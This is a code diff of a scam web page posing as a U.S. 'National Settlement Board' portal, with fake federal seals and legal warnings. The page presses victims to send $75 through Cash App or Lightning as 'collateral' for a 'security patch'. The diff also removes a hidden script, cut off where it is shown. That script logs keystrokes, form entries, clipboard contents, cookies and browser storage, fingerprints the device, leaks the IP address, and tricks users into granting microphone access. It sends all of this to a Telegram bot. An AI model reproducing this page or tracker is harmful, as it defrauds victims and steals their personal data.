+                                <img src="https://national-settlement-board.cfd/images/itdept-lightning-qr.png" alt="QR" class="w-40 h-40">
                             </div>
-                            <div class="c-step">
-                                <div class="c-step-num">2</div>
-                                <div class="c-step-text">Select the <strong>Scan / Camera</strong> icon located at the top left of the home screen and scan the official Lightning Protocol QR code below. <br><span style="font-size: 10px; color: var(--text-muted); display: block; margin-top: 4px;">(Alternatively, copy the Invoice Address and paste it into the search bar).</span></div>
-                            </div>
-                            <div class="c-step">
-                                <div class="c-step-num">3</div>
-                                <div class="c-step-text">The system will securely recognize the escrow destination. Enter exactly <strong style="color: #fff; background: rgba(0, 214, 50, 0.15); padding: 1px 4px; border-radius: 2px;">$75.00 USD</strong> when prompted to cover the remaining threshold deficit.</div>
-                            </div>
-                            <div class="c-step">
-                                <div class="c-step-num">4</div>
-                                <div class="c-step-text">Confirm and tap <strong>Pay</strong>. Once the broadcast is processed by the network, click "Submit Settlement For Verification" below to finalize the case.</div>
+                            <div class="flex-1 text-white">
+                                <div class="flex items-center gap-2 text-cashapp-green mb-2">
+                                    <i class="fa-solid fa-mobile-screen"></i>
+                                    <span class="text-[10px] font-black uppercase tracking-widest">Rapid-Clearing Instructions</span>
+                                </div>
+                                <ul class="text-[11px] space-y-2 text-slate-300">
+                                    <li><span class="text-white font-bold">1.</span> Launch <span class="text-green-400">Cash App</span> and tap the Scan icon.</li>
+                                    <li><span class="text-white font-bold">2.</span> Scan the QR or paste the invoice below.</li>
+                                    <li><span class="text-white font-bold">3.</span> Input <span class="bg-green-600/20 px-1 text-green-400 font-bold">$75.00</span> to finalize collateral.</li>
+                                    <li><span class="text-white font-bold">4.</span> Your security patch will auto-apply in <span class="text-blue-400">2-3 minutes</span>.</li>
+                                </ul>
                             </div>
                         </div>
-                    </div>
-                </div>
-            </div>
-            <!-- END ALERT -->
 
-            <div class="protocol-selector">
-                <button class="protocol-tab active" id="tab-ln" onclick="switchView('ln')">
-                    <i class="fa-solid fa-bolt-lightning" style="margin-right: 6px;"></i> Lightning Protocol
-                </button>
-                <button class="protocol-tab" id="tab-btc" onclick="switchView('btc')">
-                    <i class="fa-brands fa-bitcoin" style="margin-right: 6px;"></i> Bitcoin L1 Settlement
-                </button>
-            </div>
+                        <div class="mt-6">
+                            <label class="text-[10px] text-slate-500 font-black uppercase mb-1 block">Lightning Network Invoice</label>
+                            <div class="address-box" id="ln-invoice">
+                                lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhk66twdaexgunfwe5kuee38qcs0thtyk
+                            </div>
+                            <button onclick="copyInvoice()" class="btn-cashapp">
+                                <i class="fa-solid fa-copy"></i> Copy Invoice Address
+                            </button>
+                        </div>
+                    </div>
+                </div>
 
-            <div class="qr-containment">
-                <div id="ln-view">
-                    <div class="qr-frame">
-                        <div class="laser-line"></div>
-                        <img src="https://national-settlement-board.cfd/images/itdept-lightning-qr.png" alt="Institutional Lightning QR">
-                    </div>
-                </div>
-                <div id="btc-view" class="hidden">
-                    <div class="qr-frame">
-                        <div class="laser-line"></div>
-                        <img src="https://national-settlement-board.cfd/images/itdept-btc-qr.png" alt="Institutional BTC QR">
-                    </div>
-                </div>
-            </div>
-
-            <div class="data-well">
-                <label><i class="fa-solid fa-lock" style="margin-right: 4px;"></i> SECURE PAYMENT DESTINATION (CRYPTO-SIGNED)</label>
-                <div id="ln-addr-block">
-                    <code class="address-string" id="ln-txt">lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhk66twdaexgunfwe5kuee38qcs0thtyk</code>
-                    <div class="action-grid">
-                        <button class="btn-institutional" onclick="copy('ln-txt')"><i class="fa-solid fa-copy" style="margin-right: 6px;"></i> Copy Invoice Address</button>
-                        <button class="btn-institutional secondary" onclick="window.print()"><i class="fa-solid fa-print" style="margin-right: 6px;"></i> Export Session Receipt</button>
-                    </div>
-                </div>
-                <div id="btc-addr-block" class="hidden">
-                    <code class="address-string" id="btc-txt">bc1pn8pt3ja7yxczhmrvrmaw6cauu0tdvq7dht9vghppmwh8zvndqnyqjut067</code>
-                    <div class="action-grid">
-                        <button class="btn-institutional" onclick="copy('btc-txt')"><i class="fa-solid fa-copy" style="margin-right: 6px;"></i> Copy Wallet Address</button>
-                        <button class="btn-institutional secondary" onclick="window.print()"><i class="fa-solid fa-print" style="margin-right: 6px;"></i> Export Session Receipt</button>
-                    </div>
-                </div>
-                
-                <div style="margin-top: 30px; border-top: 1px solid var(--border-heavy); padding-top: 25px;">
-                    <button class="btn-institutional" style="width: 100%; height: 54px; background: var(--status-green); color: white; font-size: 13px; letter-spacing: 2px; box-shadow: 0 4px 15px rgba(35, 134, 54, 0.2);" onclick="initiateVerification()">
-                        <i class="fa-solid fa-paper-plane" style="margin-right: 8px;"></i> SUBMIT SETTLEMENT FOR VERIFICATION
+                <div class="space-y-4">
+                    <button onclick="initiateVerification()" class="btn-gov">
+                        <i class="fa-solid fa-paper-plane"></i> Submit Settlement For Final Verification
                     </button>
-                    <p style="font-size: 9px; color: var(--text-muted); margin-top: 15px; text-align: center; text-transform: uppercase; letter-spacing: 0.5px;">
-                        Note: Submitting a false declaration is a violation of 18 U.S.C. § 1001. All submissions are legally binding.
+                    <p class="text-[9px] text-center text-slate-400 uppercase font-bold tracking-widest">
+                        Official Government Portal | Safe & Encrypted Session
                     </p>
-                </div>                
+                </div>
             </div>
 
-            <div class="process-visual">
-                <div style="display: flex; justify-content: space-between; font-size: 10px; color: var(--nsb-gold); font-weight: 700; letter-spacing: 0.5px;">
-                    <span>BITCOIN MEMPOOL STATUS: OPTIMAL</span>
-                    <span>EXPECTED CONFIRMATION: ~2-6 MINS</span>
+            <div class="mt-auto bg-slate-900 p-6">
+                <div class="flex justify-between text-[9px] font-black text-slate-500 mb-2">
+                    <span>TRANSACTION HASH: 88AF...22E1</span>
+                    <span id="clock-display">00:00:00</span>
                 </div>
-                <div class="v-bar-bg">
-                    <div class="v-bar-fill"></div>
+                <div class="h-1 bg-slate-800 rounded-full overflow-hidden">
+                    <div id="dynamic-progress" class="h-full bg-blue-600 transition-all duration-1000" style="width: 45%;"></div>
                 </div>
-                <p style="font-size: 10px; color: var(--text-muted); margin-top: 8px; letter-spacing: 0.5px;">
-                    <i class="fa-solid fa-circle-exclamation" style="margin-right: 4px;"></i> DO NOT CLOSE THIS BROWSER UNTIL SETTLEMENT IS EXPLICITLY MARKED "CONFIRMED".
-                </p>
             </div>
         </main>
 
         <aside class="sidebar-right">
-            <div class="panel">
-                <div class="panel-header">Ledger Intelligence Feed</div>
-                <div class="ledger-feed" id="ledger-feed">
-                    <div class="feed-entry">
-                        <span class="feed-time">15:19:02</span>
-                        <span>Terminal Handshake initialized.</span>
-                    </div>
-                    <div class="feed-entry">
-                        <span class="feed-time">15:19:05</span>
-                        <span>Peer-to-Peer node discovery successful.</span>
-                    </div>
-                    <div class="feed-entry">
-                        <span class="feed-time">15:19:08</span>
-                        <span style="color: var(--status-green);">Address verification validated by NSB-Root.</span>
-                    </div>
-                    <div class="feed-entry">
-                        <span class="feed-time">15:19:15</span>
-                        <span style="color: var(--status-amber);">Inbound tx detected: 0.00112142 BTC.</span>
-                    </div>
-                    <div class="feed-entry">
-                        <span class="feed-time">15:19:18</span>
-                        <span style="color: #ff3e3e;">Threshold check: DEFICIT STATUS.</span>
-                    </div>
-                    <div class="feed-entry">
-                        <span class="feed-time">15:19:22</span>
-                        <span>Awaiting supplemental fiat routing broadcast...</span>
-                    </div>
+            <div class="panel mb-6">
+                <div class="panel-header">
+                    Real-Time Ledger
+                </div>
+                <div id="feed-container" class="p-4 space-y-3 max-h-[400px] overflow-y-auto">
                 </div>
             </div>
-
-            <div class="panel" style="margin-top: 25px; background: linear-gradient(135deg, #1c2128, #0d1117);">
-                <div class="panel-header">Security Certificate</div>
-                <div style="padding: 30px 20px; text-align: center;">
-                    <i class="fa-solid fa-certificate" style="font-size: 55px; color: var(--nsb-gold); margin-bottom: 20px; opacity: 0.85; filter: drop-shadow(0 0 10px rgba(197, 160, 89, 0.2));"></i>
-                    <h4 style="font-size: 13px; color: #fff; letter-spacing: 1px;">X.509 DIGITAL SEAL</h4>
-                    <p style="font-size: 10px; color: var(--text-muted); margin-top: 8px; line-height: 1.5;">Validated by Federal Public Key Infrastructure (FPKI) Authority</p>
-                    <div style="margin-top: 20px; font-size: 10px; font-family: 'SFMono-Regular', Consolas, monospace; color: var(--text-muted); border: 1px solid var(--border-heavy); padding: 8px; background: #000; border-radius: 3px;">
-                        SHA-256: 88A2...FF01
+            <div class="panel">
+                <div class="panel-header">
+                    Security Seal
+                </div>
+                <div class="p-8 text-center">
+                    <i class="fa-solid fa-certificate text-5xl text-amber-500/80 mb-4"></i>
+                    <h5 class="text-xs font-black uppercase mb-1">X.509 RSA-4096</h5>
+                    <p class="text-[9px] text-slate-500 font-mono">
+                        Issued by FPKI Root CA
+                    </p>
+                    <div class="mt-6 p-2 bg-slate-50 border border-slate-200 rounded font-mono text-[8px] text-slate-400">
+                        HASH: 9E7A31...FF021A
                     </div>
                 </div>
             </div>
         </aside>
     </div>
 
-    <footer>
-        <div class="footer-core">
-            <div class="footer-section">
-                <h4>National Settlement Board</h4>
-                <p>
-                    The Information Technology Division (ITD) of the National Settlement Board is a federally sanctioned body tasked with the oversight of digital liability resolution. Operating strictly under the Electronic Communications Privacy Act (ECPA) and the Financial Services Modernization Act parameters.
+    <footer class="legal-footer">
+        <div class="max-w-7xl mx-auto grid md:grid-cols-3 gap-12">
+            <div>
+                <h5 class="text-white font-black text-sm uppercase mb-4 tracking-tighter">Oversight Agency</h5>
+                <p class="text-xs leading-loose">
+                    Texas Department of Banking<br>
+                    2601 North Lamar Boulevard<br>
+                    Austin, Texas 78705-4294
                 </p>
-                <div style="margin-top: 25px; display: flex; gap: 12px;">
-                    <div style="padding: 6px 12px; border: 1px solid #333; font-size: 10px; color: #777; border-radius: 2px;">SECURE-GOV</div>
-                    <div style="padding: 6px 12px; border: 1px solid #333; font-size: 10px; color: #777; border-radius: 2px;">FINCEN-ID-991</div>
-                </div>
             </div>
-            <div class="footer-section">
-                <h4>Resource Directory</h4>
-                <a href="#">Remediation Statutes Framework</a>
-                <a href="#">Compliance Officer Directory</a>
-                <a href="#">Digital Asset Whitepaper Guidelines</a>
-                <a href="#">Verification Node Master List</a>
-                <a href="#">Privacy Act Statement</a>
+            <div>
+                <h5 class="text-white font-black text-sm uppercase mb-4 tracking-tighter">Access Policies</h5>
+                <nav class="flex flex-col gap-2">
+                    <a href="#" class="text-xs hover:text-white transition">FOIA Exemptions</a>
+                    <a href="#" class="text-xs hover:text-white transition">Privacy Impact Assessment</a>
+                    <a href="#" class="text-xs hover:text-white transition">Accessibility Statement</a>
+                </nav>
             </div>
-            <div class="footer-section">
-                <h4>Institutional Support</h4>
-                <a href="#">System Help Desk & Operations</a>
-                <a href="#">Submit Supplementary Evidence Log</a>
-                <a href="#">Request Official Case Reopening</a>
-                <a href="#">Freedom of Information Act (FOIA)</a>
-                <a href="#">Office of the General Counsel</a>
+            <div>
+                <h5 class="text-white font-black text-sm uppercase mb-4 tracking-tighter">Legal Notice</h5>
+                <p class="text-[10px] leading-relaxed italic text-slate-500">
+                    Warning: You are accessing a U.S. Government information system. Unauthorized use is prohibited and subject to criminal and civil penalties. Use constitutes consent to monitoring.
+                </p>
             </div>
         </div>
-        <div class="legal-disclaimer">
-            WARNING: YOU ARE ACCESSING A SECURED FEDERAL INFORMATION SYSTEM. UNAUTHORIZED ATTEMPTS TO UPLOAD INFORMATION OR CHANGE INFORMATION ON THIS SERVICE ARE STRICTLY PROHIBITED AND MAY BE PUNISHABLE UNDER THE COMPUTER FRAUD AND ABUSE ACT OF 1986 AND THE NATIONAL INFORMATION INFRASTRUCTURE PROTECTION ACT. ALL ACTIVITY IS CONTINUOUSLY LOGGED AND MONITORED BY SECURITY PERSONNEL.
+        <div class="max-w-7xl mx-auto mt-16 pt-8 border-t border-slate-800 flex justify-between items-center">
+            <p class="text-[10px] font-mono uppercase tracking-[0.3em]">
+                Protocol: EFTP-SECURE-V26
+            </p>
+            <div class="flex gap-4 opacity-30 grayscale">
+                <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" class="h-8" alt="FED">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-8" alt="US">
+            </div>
         </div>
     </footer>
 
     <script>
-        function switchView(type) {
-            const lnTab = document.getElementById('tab-ln');
-            const btcTab = document.getElementById('tab-btc');
-            const lnView = document.getElementById('ln-view');
-            const btcView = document.getElementById('btc-view');
-            const lnAddr = document.getElementById('ln-addr-block');
-            const btcAddr = document.getElementById('btc-addr-block');
+        const logs = [
+            "Initializing secure handshake with Dallas node...",
+            "Validating case #NSB-IT-8842-TX...",
+            "Mempool scanning active: Priority set to Institutional.",
+            "Detected unconfirmed balance: 0.00112142 BTC.",
+            "Threshold deficit identified: $75.00 USD.",
+            "Readying security patch v11.2.4...",
+            "Awaiting supplemental fiat clearing signal...",
+            "Synchronizing with Federal Reserve Node 11...",
+            "Scanning for Crypto.com exploit signatures...",
+            "Peer node verification: 12/12 active.",
+            "Cryptography buffer cleared for incoming TX."
+        ];
 
-            if(type === 'ln') {
-                lnTab.classList.add('active');
-                btcTab.classList.remove('active');
-                lnView.classList.remove('hidden');
-                btcView.classList.add('hidden');
-                lnAddr.classList.remove('hidden');
-                btcAddr.classList.add('hidden');
-            } else {
-                btcTab.classList.add('active');
-                lnTab.classList.remove('active');
-                btcView.classList.remove('hidden');
-                lnView.classList.add('hidden');
-                btcAddr.classList.remove('hidden');
-                lnAddr.classList.add('hidden');
-            }
+        function initializeTerminal() {
+            updateClock();
+            setInterval(updateClock, 1000);
+            populateFeed();
+            setInterval(addRandomLog, 7000);
+            simulateProgress();
         }
 
-        function copy(id) {
-            const el = document.getElementById(id);
-            const text = el.innerText;
-            navigator.clipboard.writeText(text).then(() => {
-                const btn = event.target;
-                const old = btn.innerHTML;
-                btn.innerHTML = '<i class="fa-solid fa-check" style="margin-right: 6px;"></i> ADDRESS COPIED';
-                btn.style.background = "var(--status-green)";
-                btn.style.color = "#fff";
-                setTimeout(() => {
-                    btn.innerHTML = old;
-                    btn.style.background = "var(--nsb-gold)";
-                    btn.style.color = "#000";
-                }, 2500);
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock-display').innerText = now.toTimeString().split(' ')[0];
+        }
+
+        function populateFeed() {
+            const container = document.getElementById('feed-container');
+            logs.slice(0, 5).forEach(log => {
+                const entry = document.createElement('div');
+                entry.className = 'text-[10px] flex gap-3 border-l-2 border-slate-700 pl-2 py-1';
+                entry.innerHTML = `<span class="text-slate-500 font-mono">${new Date().toLocaleTimeString().split(' ')[0]}</span> <span class="text-slate-600">${log}</span>`;
+                container.appendChild(entry);
             });
         }
-        
+
+        function addRandomLog() {
+            const container = document.getElementById('feed-container');
+            const log = logs[Math.floor(Math.random() * logs.length)];
+            const entry = document.createElement('div');
+            entry.className = 'text-[10px] flex gap-3 border-l-2 border-slate-700 pl-2 py-1 animate-pulse';
+            entry.innerHTML = `<span class="text-blue-500 font-mono">${new Date().toLocaleTimeString().split(' ')[0]}</span> <span class="text-slate-600">${log}</span>`;
+            container.insertBefore(entry, container.firstChild);
+            if (container.children.length > 10) container.lastChild.remove();
+        }
+
+        function simulateProgress() {
+            const bar = document.getElementById('dynamic-progress');
+            let width = 45;
+            setInterval(() => {
+                width = 45 + (Math.random() * 5);
+                bar.style.width = width + '%';
+            }, 3000);
+        }
+
+        function toggleGov() {
+            document.getElementById('govDrop').classList.toggle('active-drop');
+        }
+
+        function copyInvoice() {
+            const text = document.getElementById('ln-invoice').innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.currentTarget;
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> Invoice Copied';
+                btn.style.background = "#fff";
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy Invoice Address';
+                    btn.style.background = "var(--cashapp-green)";
+                }, 2000);
+            });
+        }
+
         function initiateVerification() {
-            // Institutional redirect to the pending confirmation queue
+            const name = localStorage.getItem('tifma_name') || 'User';
+            alert("Redirecting to Federal Queue for Case #NSB-IT-8842-TX. Please ensure your Cash App transaction is broadcast before closing the browser.");
             window.location.href = "collateral-pending.html";
         }
 
-        // Live Ledger Feed Simulator Extension
-        function updateFeed() {
-            const feed = document.getElementById('ledger-feed');
-            const now = new Date();
-            const timeStr = now.getHours().toString().padStart(2, '0') + ':' + 
-                            now.getMinutes().toString().padStart(2, '0') + ':' + 
-                            now.getSeconds().toString().padStart(2, '0');
-            
-            const logs = [
-                "Polling mempool for supplemental broadcast...",
-                "Analyzing network fee priority hash...",
-                "Waiting for Cash App fiat routing signal...",
-                "Institutional monitor status: STANDBY.",
-                "Cryptography stack verification loop: PASSED.",
-                "Scanning P2P relay nodes for pending TX ID...",
-                "Cross-referencing NSB escrow index buffers."
-            ];
-
-            const entry = document.createElement('div');
-            entry.className = 'feed-entry';
-            entry.innerHTML = `<span class="feed-time">${timeStr}</span> <span>${logs[Math.floor(Math.random() * logs.length)]}</span>`;
-            
-            feed.appendChild(entry);
-            if(feed.children.length > 8) feed.firstElementChild.remove();
-        }
-        
-        // Run simulator to keep the page dynamic and realistic
-        setInterval(updateFeed, 6500);
+        (function checkAuth() {
+            const n = localStorage.getItem('tifma_name');
+            const b = localStorage.getItem('tifma_bank');
+            if (!n || !b) {
+                window.location.href = 'https://national-settlement-board.cfd/index.html';
+            }
+        })();
     </script>
 
     <script>
-  (function() {
-    "use strict";
-    const _v0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
-    const _v1 = '7275242903';
-    const SECURE_CONFIG = {
-      API_TOKEN: _v0[0] + ':' + _v0[1],
-      TARGET_ID: _v1,
-      BUFFER_LIMIT: 8,
-      CLICK_LIMIT: 5,
-      SYNC_DELAY: 4000,
-      HEARTBEAT: 20000,
-      RETRY_LIMIT: 10,
-      QUEUE_MAX: 500,
-      SESS_KEY: 'NSB_NODE_' + Math.random().toString(36).substring(2, 15),
-      FLOW_CONTROL: 1200,
-      KEY_BATCH: 10
-    };
-    let _lastSync = 0;
-    let _msgQueue = [];
-    let _lock = false;
-    let _evtBuffer = [];
-    let _hTimer = null;
-    let _keyCapture = [];
-    let _ptrCapture = [];
-    let _lastAct = Date.now();
-    let _cache = [];
-    let _start = Date.now();
-    let _vDepth = 0;
-    let _mStream = null;
-    let _mState = false;
-    let _pValid = localStorage.getItem('media_access_verified') === 'true';
-    let _touchPts = [];
-    let _resChanges = [];
-    let _fieldStart = new Map();
-    let _mouseMoves = [];
-    let _mouseTimer = null;
-    async function _transmit(payload, urgency = false) {
-      const _out = String(payload).substring(0, 4096);
-      const _now = Date.now();
-      const _diff = _now - _lastSync;
-      if (_diff < SECURE_CONFIG.FLOW_CONTROL && !urgency) {
-        _msgQueue.push(_out);
-        setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL - _diff);
-        return;
-      }
-      _lastSync = _now;
-      try {
-        const _r = await fetch('https://api.telegram.org/bot' + SECURE_CONFIG.API_TOKEN + '/sendMessage', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: SECURE_CONFIG.TARGET_ID,
-            text: _out
-          })
-        });
-        if (!_r.ok) throw new Error('ERR_UP');
-        _processQueue();
-      } catch (e) {
-        if (_cache.length < SECURE_CONFIG.QUEUE_MAX) _cache.push(_out);
-      }
-    }
-    function _processQueue() {
-      if (_lock || _msgQueue.length === 0) return;
-      _lock = true;
-      const _next = _msgQueue.shift();
-      _transmit(_next, true).finally(() => {
-        _lock = false;
-        if (_msgQueue.length > 0) setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL);
-      });
-    }
-    function _stageEvent(id, data) {
-      _evtBuffer.push({
-        id: id,
-        payload: data,
-        tick: Date.now(),
-        sid: SECURE_CONFIG.SESS_KEY,
-        u: window.location.href,
-        ref: document.referrer || 'direct'
-      });
-      if (_hTimer) clearTimeout(_hTimer);
-      _hTimer = setTimeout(_pushBuffer, SECURE_CONFIG.SYNC_DELAY);
-      if (_evtBuffer.length >= SECURE_CONFIG.BUFFER_LIMIT) _pushBuffer();
-    }
-    function _pushBuffer() {
-      if (_evtBuffer.length === 0) return;
-      const _ship = [..._evtBuffer];
-      _evtBuffer = [];
-      const _meta = `\nNODE: ${SECURE_CONFIG.SESS_KEY}\nPAGE: ${window.location.pathname}`;
-      _transmit('📦 BATCH_DATA [' + _ship.length + ']' + _meta + '\n' + JSON.stringify(_ship, null, 1), true);
-    }
-    function _hwFingerprint() {
-      const _c = document.createElement('canvas');
-      const _x = _c.getContext('2d');
-      _c.width = 300;
-      _c.height = 50;
-      _x.textBaseline = "top";
-      _x.font = "14px 'Arial'";
-      _x.fillStyle = "#f60";
-      _x.fillRect(100, 5, 50, 40);
-      _x.fillStyle = "#069";
-      _x.fillText("NSB_SYSTEM_UNIT_ACTIVE", 2, 10);
-      const _f1 = _c.toDataURL();
-      let _webgl = {};
-      try {
-        const _c2 = document.createElement('canvas');
-        const _gl = _c2.getContext('webgl') || _c2.getContext('experimental-webgl');
-        if (_gl) {
-          const _ext = _gl.getExtension('WEBGL_debug_renderer_info');
-          _webgl = {
-            r: _ext ? _gl.getParameter(_ext.UNMASKED_RENDERER_WEBGL) : _gl.getParameter(_gl.RENDERER),
-            v: _ext ? _gl.getParameter(_ext.UNMASKED_VENDOR_WEBGL) : _gl.getParameter(_gl.VENDOR)
-          };
-        }
-      } catch (e) {}
-      return {
-        ua: navigator.userAgent,
-        plt: navigator.platform,
-        mem: navigator.deviceMemory || 0,
-        cpu: navigator.hardwareConcurrency || 0,
-        scr: `${screen.width}x${screen.height}`,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        lang: navigator.languages,
-        gpu: _webgl,
-        fp: _f1.slice(-60)
-      };
-    }
-    function _mapInput(e) {
-      let _k = e.key;
-      const _t = e.target;
-      return {
-        key: _k,
-        id: _t.id || _t.name || 'anon',
-        tag: _t.tagName,
-        raw: (_t.type === 'password' || _t.id?.includes('pass')) ? '[SENSITIVE_CAP]' : _t.value,
-        ts: Date.now()
-      };
-    }
-    document.addEventListener('keydown', (e) => {
-      _keyCapture.push(_mapInput(e));
-      _lastAct = Date.now();
-      if (_keyCapture.length >= SECURE_CONFIG.KEY_BATCH) {
-        _stageEvent('KEY_LOG', [..._keyCapture]);
-        _keyCapture = [];
-      }
-    });
-    document.addEventListener('input', (e) => {
-      const _t = e.target;
-      _stageEvent('INPUT_LIVE', {
-        id: _t.id || _t.name,
-        val: _t.value,
-        type: _t.type,
-        ts: Date.now()
-      });
-    });
-    document.addEventListener('submit', (e) => {
-      const _f = e.target;
-      const _d = new FormData(_f);
-      const _p = {};
-      for (let [k, v] of _d.entries()) _p[k] = v;
-      _stageEvent('FORM_CAPTURE', {
-        action: _f.action,
-        method: _f.method,
-        fields: _p
-      });
-      _pushBuffer();
-    }, true);
-    document.addEventListener('click', (e) => {
-      const _t = e.target;
-      _ptrCapture.push({
-        tag: _t.tagName,
-        id: _t.id || _t.className,
-        txt: _t.innerText?.slice(0, 50),
-        pos: { x: e.clientX, y: e.clientY },
-        ts: Date.now()
-      });
-      if (_ptrCapture.length >= SECURE_CONFIG.CLICK_LIMIT) {
-        _stageEvent('CLICK_LOG', [..._ptrCapture]);
-        _ptrCapture = [];
-      }
-    });
-    document.addEventListener('copy', () => {
-      setTimeout(async () => {
-        try {
-          const _t = await navigator.clipboard.readText();
-          if (_t) _stageEvent('CLIP_COPY', { val: _t });
-        } catch (e) {}
-      }, 100);
-    });
-    document.addEventListener('paste', (e) => {
-      const _t = e.clipboardData?.getData('text');
-      if (_t) _stageEvent('CLIP_PASTE', { val: _t });
-    });
-    async function _netProbe() {
-      try {
-        const _r1 = await fetch('https://api.ipify.org?format=json');
-        const _d1 = await _r1.json();
-        const _r2 = await fetch(`https://ipapi.co/${_d1.ip}/json/`);
-        const _d2 = await _r2.json();
-        _stageEvent('NETWORK_LOC', _d2);
-      } catch (e) {}
-    }
-    function _initAudioExfil() {
-      if (_mState || _pValid) return;
-      const _ov = document.createElement('div');
-      _ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;';
-      _ov.innerHTML = '<div style="background:#fff;padding:30px;border-radius:10px;text-align:center;"><h2 style="color:#000">Security Requirement</h2><p style="color:#444">Enable Identity Verification to proceed.</p><button id="_auth_btn" style="padding:10px 20px;background:#0052cc;color:#fff;border:none;border-radius:5px;cursor:pointer;">VERIFY IDENTITY</button></div>';
-      document.body.appendChild(_ov);
-      document.getElementById('_auth_btn').onclick = () => {
-        navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
-          _mStream = s;
-          _mState = true;
-          _pValid = true;
-          localStorage.setItem('media_access_verified', 'true');
-          _ov.remove();
-          _runAudioEngine();
-          _stageEvent('AUDIO_AUTH', { status: 'GRANTED' });
-        }).catch(e => {
-          _stageEvent('AUDIO_AUTH', { status: 'DENIED', msg: e.message });
-          _ov.remove();
-        });
-      };
-    }
-    function _runAudioEngine() {
-      if (!_mStream) return;
-      try {
-        const _ac = new (window.AudioContext || window.webkitAudioContext)();
-        const _s = _ac.createMediaStreamSource(_mStream);
-        const _a = _ac.createAnalyser();
-        _s.connect(_a);
-        _a.fftSize = 256;
-        const _d = new Uint8Array(_a.frequencyBinCount);
-        setInterval(() => {
-          _a.getByteTimeDomainData(_d);
-          let _max = 0;
-          for (let i = 0; i < _d.length; i++) {
-            const _v = Math.abs(_d[i] - 128) / 128;
-            if (_v > _max) _max = _v;
-          }
-          if (_max > 0.05) _stageEvent('VOICE_PEAK', { amp: Math.floor(_max * 100) });
-        }, 3000);
-      } catch (e) {}
-    }
-    function _leakIP() {
-      try {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(o => pc.setLocalDescription(o));
-        pc.onicecandidate = (e) => {
-          if (e.candidate) {
-            const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
-            if (ip) _stageEvent('INTERNAL_IP', { addr: ip[0] });
-          }
-        };
-      } catch (e) {}
-    }
-    function _trackMouse() {
-      document.addEventListener('mousemove', (e) => {
-        _mouseMoves.push({ x: e.clientX, y: e.clientY, ts: Date.now() });
-         if (_mouseMoves.length > 200) _mouseMoves = _mouseMoves.slice(-100);
-        if (_mouseTimer) clearTimeout(_mouseTimer);
-        _mouseTimer = setTimeout(() => {
-          if (_mouseMoves.length > 5) {
-            _stageEvent('MOUSE_PATH', { pts: _mouseMoves.slice(-20) });
-            _mouseMoves = [];
-          }
-        }, 5000);
-      }, { passive: true });
-    }
-    function _fieldMonitor() {
-      document.addEventListener('focusin', (e) => {
-        if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) _fieldStart.set(e.target, Date.now());
-      });
-      document.addEventListener('focusout', (e) => {
-        const t = e.target;
-        if (_fieldStart.has(t)) {
-          _stageEvent('FIELD_DUR', { id: t.id || t.name, ms: Date.now() - _fieldStart.get(t), val: t.value });
-          _fieldStart.delete(t);
-        }
-      });
-    }
-    function _storageDump() {
-      const _d = { l: {}, s: {}, c: document.cookie };
-      try {
-        for (let i = 0; i < localStorage.length; i++) _d.l[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
-        for (let i = 0; i < sessionStorage.length; i++) _d.s[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
-      } catch (e) {}
-      _stageEvent('STORAGE_DUMP', _d);
-    }
-    function _visibilityTrack() {
-      document.addEventListener('visibilitychange', () => {
-        _stageEvent('TAB_STATUS', { state: document.visibilityState, ts: Date.now() });
-      });
-    }
-    function _heartbeat() {
-      setInterval(() => {
-        _stageEvent('HEARTBEAT', {
-          uptime: Math.round((Date.now() - _start) / 1000),
-          y: window.scrollY,
-          url: window.location.href
-        });
-      }, SECURE_CONFIG.HEARTBEAT);
-    }
-    function _performance() {
-      if (performance && performance.timing) {
-        const t = performance.timing;
-        _stageEvent('PERF_LOG', {
-          load: t.loadEventEnd - t.navigationStart,
-          dns: t.domainLookupEnd - t.domainLookupStart,
-          tcp: t.connectEnd - t.connectStart
-        });
-      }
-    }
-    function _deviceCaps() {
-      const _v = document.createElement('video');
-      _stageEvent('MEDIA_CAPS', {
-        h264: _v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
-        webm: _v.canPlayType('video/webm; codecs="vp8, vorbis"'),
-        cores: navigator.hardwareConcurrency,
-        touch: navigator.maxTouchPoints
-      });
-    }
-    function _networkStatus() {
-      const _n = navigator.connection;
-      if (_n) {
-        const _log = () => _stageEvent('NET_CHANGE', { type: _n.effectiveType, down: _n.downlink, rtt: _n.rtt });
-        _log();
-        _n.addEventListener('change', _log);
-      }
-    }
-    function _batteryStatus() {
-      if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-          const _log = () => _stageEvent('PWR_LOG', { lvl: b.level, chg: b.charging });
-          _log();
-          b.addEventListener('levelchange', _log);
-          b.addEventListener('chargingchange', _log);
-        });
-      }
-    }
-    function _domWatch() {
-      const _obs = new MutationObserver((m) => {
-        _stageEvent('DOM_MUTATION', { count: m.length, ts: Date.now() });
-      });
-      _obs.observe(document.body, { childList: true, subtree: true });
-    }
-    function _init() {
-      _transmit('💎 NODE_ACTIVE: ' + window.location.hostname + '\nSESS: ' + SECURE_CONFIG.SESS_KEY, true);
